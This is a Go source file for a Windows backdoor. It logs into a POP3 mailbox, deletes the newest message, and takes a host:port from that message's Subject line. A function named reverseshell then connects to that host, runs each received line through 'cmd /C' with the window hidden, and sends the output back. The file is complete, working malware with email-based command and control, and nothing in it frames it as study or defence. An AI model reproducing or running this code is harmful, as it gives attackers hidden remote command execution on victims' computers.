package main
import (
    "go-pop3"
    "log"
    "strings"
    "os/exec"
    "net"
    "fmt"
    "syscall"
    "bufio"
)


func reverseshell(addr string){

    c,_:=net.Dial("tcp", addr);

    for{
        status, _ := bufio.NewReader(c).ReadString('\n');
        fmt.Println(status)
        cmd := exec.Command("cmd", "/C", status)
        cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
        out, _ := cmd.Output();
        c.Write([]byte(out))
    }
}


func main(){
    client, err := pop3.Dial("pop.sina.com:110")

    if err != nil {
        log.Fatalf("Error: %v\n", err)
    }

    defer func() {
        client.Quit()
        client.Close()
    }()

    if err = client.User("username"); err != nil {
        log.Printf("Error: %v\n", err)
        return
    }

    if err = client.Pass("password"); err != nil {
        log.Printf("Error: %v\n", err)
        return
    }

    var count int
    var size uint64

    if count, size, err = client.Stat(); err != nil {
        log.Printf("Error: %v\n", err)
        return
    }

    log.Printf("Count: %d, Size: %d\n", count, size)

    var content string

    if content, err = client.Retr(count); err != nil {
        log.Printf("Error: %v\n", err)
        return
    }

    if err = client.Dele(count); err != nil {
        log.Printf("Error: %v\n", err)
        return
    }

    if err = client.Noop(); err != nil {
        log.Printf("Error: %v\n", err)
        return
    }

    if err = client.Rset(); err != nil {
        log.Printf("Error: %v\n", err)
        return
    }

    list := strings.Split(content, "\r\n")
    for i := 0; i < len(list); i++ {
        line := list[i]
        if strings.Contains(line, "Subject:"){
            addrlist := strings.Split(line, ":")
            temp_addr := addrlist[1] + ":" + addrlist[2]
            addr := strings.Replace(temp_addr, " ", "", -1)  
            reverseshell(addr)
            break
        } 
    }
}